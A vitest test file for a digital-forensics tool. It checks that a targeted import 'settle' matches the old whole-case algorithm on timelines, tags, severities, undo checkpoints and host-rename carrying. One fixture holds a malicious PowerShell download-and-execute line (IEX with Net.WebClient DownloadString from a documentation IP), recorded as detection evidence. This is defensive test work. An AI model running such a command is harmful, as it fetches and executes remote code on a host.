import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { SuperTimelineStore } from "../../src/analysis/superTimelineStore.js";
import { ForensicGateControlStore } from "../../src/analysis/forensicGateControl.js";
import { TagsStore } from "../../src/analysis/tags.js";
import { TaggerStore } from "../../src/analysis/taggerStore.js";
import { StateLock } from "../../src/analysis/stateLock.js";
import { MockProvider } from "../../src/providers/provider.js";
import { AnalysisPipeline } from "../../src/analysis/pipeline.js";
import { settleForensicImport, type SettleDeps } from "../../src/routes/importSettle.js";
import { createImportDemote } from "../../src/composition/importDemote.js";
import { autoTagNewEvents } from "../../src/analysis/taggerAuto.js";
import { captureImportBaseline, releaseImportBaseline } from "../../src/analysis/importBaseline.js";
import { baselineCheckpoint } from "../../src/analysis/importUndoRows.js";
import { applyUndoDelta, computeUndoDelta } from "../../src/analysis/importUndoDelta.js";
import { carryHostRenames } from "../../src/analysis/hostRenameCarry.js";
import { capBuildTimeRows } from "../../src/analysis/buildTimeWindow.js";
import { demoteBelowSeverity } from "../../src/analysis/forensicGate.js";
import { downgradeFirstPartyEgress } from "../../src/analysis/firstPartyEgress.js";
import { downgradeGenericSysmonRegistry } from "../../src/analysis/genericSysmonRegistry.js";
import { runAndApplyTagger } from "../../src/analysis/taggerRun.js";
import { diffTimeline } from "../../src/analysis/timelineDiff.js";
import { diffIocs } from "../../src/analysis/iocsDiff.js";
import type { AppOptions } from "../../src/composition/appOptions.js";
import type { ForensicEvent, InvestigationState } from "../../src/analysis/stateTypes.js";

// #1874: the settle reads and writes only the rows it changes. These tests import real evidence
// through the real importers into a real case database, settle it through the targeted path, and
// compare every outcome with the old whole-case algorithm run over full copies of the same case:
// the forensic timeline (order and content), severities, the super-timeline, the tags, the diffs
// the import reports, and the undo checkpoint (which must equal computeUndoDelta(before, after)
// and round-trip back to the pre-import case).

// Raises the Info "Print Spooler" state changes (the tagger's one promotion window); the other
// Info rows stay Info and demote moves them to the super-timeline.
const RULES = `spooler:
  any:
    - { field: message, contains: ['Spooler'] }
  tags: ['spooler']
  mitre: ['T1543.003']
  severity: High
`;

function siem(prefix: string, n: number, extra: Record<string, unknown>[] = [], spooler = true): string {
  const rows = [];
  for (let i = 0; i < n; i++) {
    const svc = `${prefix}-${i}`;
    rows.push({
      "@timestamp": `2026-07-0${1 + (i % 5)}T10:0${i % 10}:00.000Z`,
      log_name: "System",
      computer_name: "S1-HOST",
      event_id: 7045,
      level: "Information",
      event_data: {
        ServiceName: svc,
        ServiceFileName: i % 2 ? `C:\\Windows\\Temp\\${svc}.exe` : `C:\\Program Files\\${svc}.exe`,
      },
    });
    rows.push({
      "@timestamp": `2026-07-0${1 + (i % 5)}T11:0${i % 10}:00.000Z`,
      log_name: "System",
      computer_name: "S1-HOST",
      event_id: 7036,
      level: "Information",
      message: `The ${i % 3 || !spooler ? "Windows Update" : "Print Spooler"} service ${prefix}-${i} entered the running state.`,
    });
  }
  return JSON.stringify([...rows, ...extra]);
}

let root: string;
let stateStore: StateStore;
let superStore: SuperTimelineStore;
let tagsStore: TagsStore;
let taggerStore: TaggerStore;
let lock: StateLock;
let p: AnalysisPipeline;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "dfir-settle-eq-"));
  const cases = new CaseStore(root);
  await cases.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: "mock" });
  stateStore = new StateStore(cases);
  superStore = new SuperTimelineStore(cases);
  tagsStore = new TagsStore(cases);
  await writeFile(join(root, "rules.yaml"), RULES);
  taggerStore = new TaggerStore(join(root, "user.yaml"), [join(root, "rules.yaml")]);
  lock = new StateLock();
  p = new AnalysisPipeline({
    provider: new MockProvider("mock", "{}"),
    stateStore,
    stateLock: lock,
    imageLoader: async () => ({ base64: "AAAA", mimeType: "image/webp" }),
  });
  gate = new ForensicGateControlStore(cases);
});
let gate: ForensicGateControlStore;

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

const runExclusive = <T>(caseId: string, fn: () => Promise<T>): Promise<T> => lock.runExclusive(caseId, fn);

function deps(overrides: Partial<SettleDeps> = {}): SettleDeps {
  const options = {
    stateStore,
    superTimelineStore: superStore,
    forensicGateControlStore: gate,
  } as unknown as AppOptions;
  const demote = createImportDemote({ options, runStateExclusive: runExclusive });
  return {
    stateStore,
    runStateExclusive: runExclusive,
    superTimelineStore: superStore,
    autoTagImported: (caseId, added) =>
      autoTagNewEvents(
        { taggerStore, tagsStore, stateStore, runStateExclusive: runExclusive },
        caseId,
        added,
      ),
    demoteForensic: demote.demoteForensic,
    ...overrides,
  };
}

// The pre-#1874 settle as pure steps over full copies of the case (routes/importSettle.ts before it).
async function reference(before: InvestigationState, merged: InvestigationState) {
  let imported = carryHostRenames(merged).state;
  const beforeIds = new Set(before.forensicTimeline.map((e) => e.id));
  const addedIds = new Set(imported.forensicTimeline.filter((e) => !beforeIds.has(e.id)).map((e) => e.id));
  const lowered = new Map(
    downgradeGenericSysmonRegistry(
      downgradeFirstPartyEgress(imported.forensicTimeline.filter((e) => addedIds.has(e.id))).events,
    ).events.map((e) => [e.id, e]),
  );
  imported = {
    ...imported,
    forensicTimeline: imported.forensicTimeline.map((e) =>
      addedIds.has(e.id) ? { ...(lowered.get(e.id) ?? e), importedAt: "T", importBatchId: "B" } : e,
    ),
  };
  const added = imported.forensicTimeline.filter((e) => addedIds.has(e.id));
  const ruleset = await taggerStore.load();
  const fakeTags = { addMany: async () => [] } as unknown as TagsStore;
  const tagged = await runAndApplyTagger({
    caseId: "c1",
    events: added,
    ruleset,
    forensicTimeline: imported.forensicTimeline,
    tagsStore: fakeTags,
    mutateForensic: true,
  });
  const capped = capBuildTimeRows({ ...imported, forensicTimeline: tagged.forensicTimeline }).state;
  const floor = (await gate.load("c1")).minSeverity ?? "Low";
  const { kept, demoted } = demoteBelowSeverity(capped.forensicTimeline, floor);
  return {
    timeline: kept,
    superIds: [...added.map((e) => e.id), ...demoted.map((e) => e.id)],
    timelineDiff: diffTimeline(before.forensicTimeline, kept),
    iocsDiff: diffIocs(before.iocs, capped.iocs),
  };
}

// The stamps are fresh per run; everything else must match exactly.
const unstamp = (rows: readonly ForensicEvent[]): ForensicEvent[] =>
  rows.map((e) => (e.importedAt ? { ...e, importedAt: "T", importBatchId: "B" } : e));

async function importAndCompare(
  run: () => Promise<unknown>,
  opts: { settleDeps?: SettleDeps } = {},
): Promise<{ before: InvestigationState }> {
  const before = await stateStore.load("c1");
  const baseline = await captureImportBaseline(stateStore, "c1");
  try {
    await run();
    const merged = await stateStore.load("c1");
    const ref = await reference(before, merged);
    const superBefore = new Set<string>();
    for await (const b of superStore.eventBatches("c1")) for (const e of b) superBefore.add(e.id);
    const settled = await settleForensicImport(opts.settleDeps ?? deps(), "c1", baseline, "label");
    const after = await stateStore.load("c1");
    expect(unstamp(after.forensicTimeline)).toEqual(unstamp(ref.timeline));
    expect(settled.timelineDiff).toEqual(ref.timelineDiff);
    expect(settled.iocsDiff).toEqual(ref.iocsDiff);
    const superAfter: string[] = [];
    for await (const b of superStore.eventBatches("c1")) for (const e of b) superAfter.push(e.id);
    expect(new Set(superAfter.filter((id) => !superBefore.has(id)))).toEqual(
      new Set(ref.superIds.filter((id) => !superBefore.has(id))),
    );
    // The undo checkpoint: what the full-copy algorithm builds, and a clean round trip.
    const checkpoint = await baselineCheckpoint(stateStore, baseline, "label", "at");
    expect(checkpoint?.delta).toEqual(computeUndoDelta(before, after));
    expect(applyUndoDelta(after, checkpoint!.delta!)).toEqual(before);
    return { before };
  } finally {
    await releaseImportBaseline(stateStore, baseline);
  }
}

describe("targeted settle matches the whole-case settle (#1874)", () => {
  it("SIEM: a first import, then a second into the same case", async () => {
    await importAndCompare(() =>
      p.importSiem("c1", siem("a", 12), {
        label: "a.json",
        idPrefix: "1",
        importedAt: "2026-09-01T00:00:00Z",
      }),
    );
    await importAndCompare(() =>
      p.importSiem("c1", siem("b", 9), {
        label: "b.json",
        idPrefix: "2",
        importedAt: "2026-09-02T00:00:00Z",
      }),
    );
    const tags = await tagsStore.load("c1");
    const after = await stateStore.load("c1");
    // Every forensic row the rule matched carries its tag and its raised grade.
    const promoted = after.forensicTimeline.filter((x) =>
      (x as { message?: string }).message?.includes("Spooler"),
    );
    expect(promoted.length).toBeGreaterThan(0);
    for (const e of promoted) {
      expect(e.severity).toBe("High");
      expect(tags.some((t) => t.targetId === e.id && t.label === "spooler")).toBe(true);
    }
    expect(after.forensicTimeline.some((e) => (e as { message?: string }).message?.includes("Update"))).toBe(
      false,
    );
  });

  it("a re-import of the same evidence changes nothing and reports nothing", async () => {
    await importAndCompare(() =>
      p.importSiem("c1", siem("a", 6), {
        label: "a.json",
        idPrefix: "1",
        importedAt: "2026-09-01T00:00:00Z",
      }),
    );
    await importAndCompare(() =>
      p.importSiem("c1", siem("a", 6), {
        label: "a2.json",
        idPrefix: "2",
        importedAt: "2026-09-02T00:00:00Z",
      }),
    );
  });

  it("keeps an analyst edit made through the state lock while the settle runs", async () => {
    await importAndCompare(() =>
      p.importSiem("c1", siem("a", 6), {
        label: "a.json",
        idPrefix: "1",
        importedAt: "2026-09-01T00:00:00Z",
      }),
    );
    const baseline = await captureImportBaseline(stateStore, "c1");
    await p.importSiem("c1", siem("b", 6), {
      label: "b.json",
      idPrefix: "2",
      importedAt: "2026-09-02T00:00:00Z",
    });
    const oldId = baseline.outline.ids[0]!;
    let editedAdded = "";
    const base = deps();
    await settleForensicImport(
      {
        ...base,
        // Between the dual-write and the cap: the analyst rewrites an old row and one of the new
        // rows, and adds a finding — a whole-case save through the lock, as the dashboard does.
        autoTagImported: async (caseId, added) => {
          await base.autoTagImported(caseId, added);
          editedAdded = added[0].id;
          await runExclusive(caseId, async () => {
            const s = await stateStore.load(caseId);
            await stateStore.save({
              ...s,
              findings: [...s.findings, { id: "f-analyst", title: "analyst" } as never],
              forensicTimeline: s.forensicTimeline.map((e) =>
                e.id === oldId || e.id === editedAdded ? { ...e, notes: "analyst note" } : e,
              ),
            });
          });
        },
      },
      "c1",
      baseline,
    );
    await releaseImportBaseline(stateStore, baseline);
    const after = await stateStore.load("c1");
    expect(after.findings.map((f) => f.id)).toContain("f-analyst");
    const byId = new Map(after.forensicTimeline.map((e) => [e.id, e]));
    expect((byId.get(oldId) as { notes?: string }).notes).toBe("analyst note");
    const added = byId.get(editedAdded) as ForensicEvent & { notes?: string };
    expect(added.notes).toBe("analyst note");
    expect(added.importedAt).toEqual(expect.any(String)); // and the stamp written before it survives too
  });

  it("demote captures before it deletes: a failed capture keeps every sub-threshold row", async () => {
    const baseline = await captureImportBaseline(stateStore, "c1");
    await p.importSiem("c1", siem("a", 6, [], false), {
      label: "a.json",
      idPrefix: "1",
      importedAt: "2026-09-01T00:00:00Z",
    });
    const broken = {
      append: async () => {
        throw new Error("disk full");
      },
    } as unknown as SuperTimelineStore;
    const options = {
      stateStore,
      superTimelineStore: broken,
      forensicGateControlStore: gate,
    } as unknown as AppOptions;
    const demote = createImportDemote({ options, runStateExclusive: runExclusive });
    await settleForensicImport(
      deps({ superTimelineStore: broken, demoteForensic: demote.demoteForensic }),
      "c1",
      baseline,
    );
    await releaseImportBaseline(stateStore, baseline);
    const after = await stateStore.load("c1");
    expect(after.forensicTimeline.some((e) => e.severity === "Info")).toBe(true);
    // With the capture working, the same rows move: in the super-timeline, gone from the forensic one.
    const working = createImportDemote({
      options: { ...options, superTimelineStore: superStore },
      runStateExclusive: runExclusive,
    });
    const removed = await working.demoteForensic("c1");
    expect(removed.length).toBeGreaterThan(0);
    const inSuper = new Set<string>();
    for await (const b of superStore.eventBatches("c1")) for (const e of b) inSuper.add(e.id);
    for (const e of removed) expect(inSuper.has(e.id)).toBe(true);
    expect((await stateStore.load("c1")).forensicTimeline.some((e) => e.severity === "Info")).toBe(false);
  });
});

// The rename scenario of tests/analysis/hostRenameCarryIngest.test.ts (#1495): an evidence-free
// file imported first, then the file that teaches the case the rename — the old row must be
// re-homed by the second import's settle, the ledger having changed.
const OLD = "WIN-UK1GV882OK6";
const MID = "WIN-0NNTB2RTNB1";
const NEW = "DESKTOP-16OJFO6";
const usage = (computer: string, user: string, at: string) => ({
  _Source: "Windows.EventLogs.CondensedAccountUsage",
  EventTime: at,
  Computer: computer,
  EventID: 4648,
  Description: "LOGON_ATTEMPT_EXPLICIT_CREDENTIALS",
  DomainName: "WORKGROUP",
  UserName: `${user}$`,
  LogonId: 999,
  CredentialsUsedFor4648: "Font Driver Host\\UMFD-0",
  LogonType: "-",
  IpAddress: "-",
  ClientName: "-",
});
const EVIDENCE = JSON.stringify([
  usage(MID, OLD, "2026-08-26T13:49:52Z"),
  usage(NEW, MID, "2026-08-26T13:52:06Z"),
]);
const BARE = JSON.stringify([
  {
    _Source: "DetectRaptor.Windows.Detection.Evtx",
    EventTime: "2025-12-05T03:02:24Z",
    Computer: OLD,
    Channel: "Microsoft-Windows-PowerShell/Operational",
    EventID: 4104,
    Detection: "Malicious PowerShell Keywords",
    EventData: {
      Path: "C:\\Users\\vagrant\\Desktop\\priv.ps1",
      ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')",
    },
    UserSID: "S-1-5-21-908230818-3748298786-230204725-1001",
    Username: "vagrant",
  },
]);
const CHAINSAW = JSON.stringify([
  {
    EventTime: "2025-12-05T03:04:00Z",
    Detection: "Suspicious Service Installation",
    Severity: "medium",
    "Rule Group": "Sigma",
    Computer: OLD,
    Channel: "System",
    EventID: 7045,
    SystemData: {
      Computer: OLD,
      EventID: 7045,
      TimeCreated_attributes: { SystemTime: "2025-12-05T03:04:00Z" },
    },
    EventData: { ServiceName: "svc", ImagePath: "C:\\Windows\\Temp\\svc.exe" },
  },
]);

describe("targeted settle matches the whole-case settle across importers and a learned rename (#1874)", () => {
  it("re-homes an old row when a later import teaches the rename, exactly as the full carry did", async () => {
    const at = "2026-09-21T12:00:00.000Z";
    // The case keeps Info rows (a per-case forensic gate), so the carried rows stay readable here.
    await gate.set("c1", { minSeverity: "Info" });
    await importAndCompare(() =>
      p.importVelociraptor("c1", BARE, { label: "evtx.json", idPrefix: "b", importedAt: at }),
    );
    await importAndCompare(() =>
      p.importChainsaw("c1", CHAINSAW, { label: "cs.json", idPrefix: "c", importedAt: at }),
    );
    await importAndCompare(() =>
      p.importVelociraptor("c1", EVIDENCE, { label: "usage.json", idPrefix: "a", importedAt: at }),
    );
    const rows = (await stateStore.load("c1")).forensicTimeline.filter((e) =>
      e.description.includes("Malicious PowerShell"),
    );
    expect(rows.length).toBeGreaterThan(0);
    for (const row of rows) {
      expect(row.asset).toBe(NEW);
      expect(row.description).toContain(`[logged under former hostname ${OLD}]`);
    }
  });
});
